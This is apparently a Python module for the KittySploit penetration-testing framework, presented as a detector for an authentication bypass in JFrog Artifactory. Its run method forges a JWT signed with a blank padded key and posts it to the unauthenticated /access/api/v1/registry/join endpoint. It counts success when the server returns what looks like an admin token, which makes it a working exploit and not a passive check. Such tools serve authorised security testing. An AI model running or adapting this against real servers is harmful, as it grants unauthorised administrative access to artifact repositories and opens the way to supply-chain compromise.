#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect JFrog Artifactory CVE-2026-82329 blank join-key authentication bypass."""

import base64
import hashlib
import hmac
import json
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "JFrog Artifactory CVE-2026-82329 Detect",
        "description": (
            "Detects CVE-2026-82329: default Artifactory installs register a blank "
            "additional join key, allowing unauthenticated POST /access/api/v1/registry/join "
            "with an HS256 JWT signed using the publicly derivable 32-byte padded key."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-82329"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-82329",
            "https://bishopfox.com/blog/cve-2026-82329-unauthenticated-administrative-access-in-jfrog-artifactory-via-an-empty-cluster-join-key",
        ],
        "tags": [
            "web",
            "scanner",
            "jfrog",
            "artifactory",
            "auth-bypass",
            "jwt",
            "cluster-join",
            "cve-2026-82329",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.2,
            "noise": 0.35,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["jfrog", "artifactory"],
                "endpoint_pattern_any": ["/access/api/v1/registry/"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "admin_access", "from_detail": "join JWT admin token"},
                ],
                "suggested_followups": [
                    "scanner/http/jfrog_artifactory_detect",
                ],
            },
        },
    }

    join_path = OptString(
        "/access/api/v1/registry/join",
        "Unauthenticated cluster join endpoint",
        False,
        advanced=True,
    )

    _BLANK_KID = hashlib.sha256(b"").hexdigest()
    _BLANK_KEY = bytes([0x20] * 32)

    @staticmethod
    def _b64url(raw: bytes) -> str:
        return base64.urlsafe_b64encode(raw).decode().rstrip("=")

    def _forge_join_jwt(self) -> str:
        header = {
            "alg": "HS256",
            "typ": "JWT",
            "kid": self._BLANK_KID,
        }
        payload = {
            "service_id": "jfrt@kittysploit-probe",
            "node_id": "kitty-node-probe",
            "iat": int(time.time()),
        }
        segments = [
            self._b64url(json.dumps(header, separators=(",", ":")).encode()),
            self._b64url(json.dumps(payload, separators=(",", ":")).encode()),
        ]
        signing_input = ".".join(segments).encode()
        signature = hmac.new(self._BLANK_KEY, signing_input, hashlib.sha256).digest()
        segments.append(self._b64url(signature))
        return ".".join(segments)

    @staticmethod
    def _looks_like_admin_token(body: str) -> bool:
        text = (body or "").strip()
        if not text:
            return False
        lowered = text.lower()
        if "admin" in lowered and ("token" in lowered or text.count(".") >= 2):
            return True
        try:
            payload = json.loads(text)
        except json.JSONDecodeError:
            return text.count(".") >= 2 and len(text) > 60
        blob = json.dumps(payload).lower()
        return "admin" in blob or "token" in blob

    def run(self):
        token = self._forge_join_jwt()
        response = self.http_request(
            method="POST",
            path=str(self.join_path or "/access/api/v1/registry/join"),
            headers={"Content-Type": "text/plain"},
            data=token,
            allow_redirects=False,
        )
        if not response:
            return False
        code = int(response.status_code or 0)
        body = response.text or ""
        if code in (200, 201) and self._looks_like_admin_token(body):
            self.set_info(
                severity="critical",
                cve="CVE-2026-82329",
                reason="Blank join-key JWT accepted by /access/api/v1/registry/join",
                path=str(self.join_path or "/access/api/v1/registry/join"),
            )
            return True
        return False
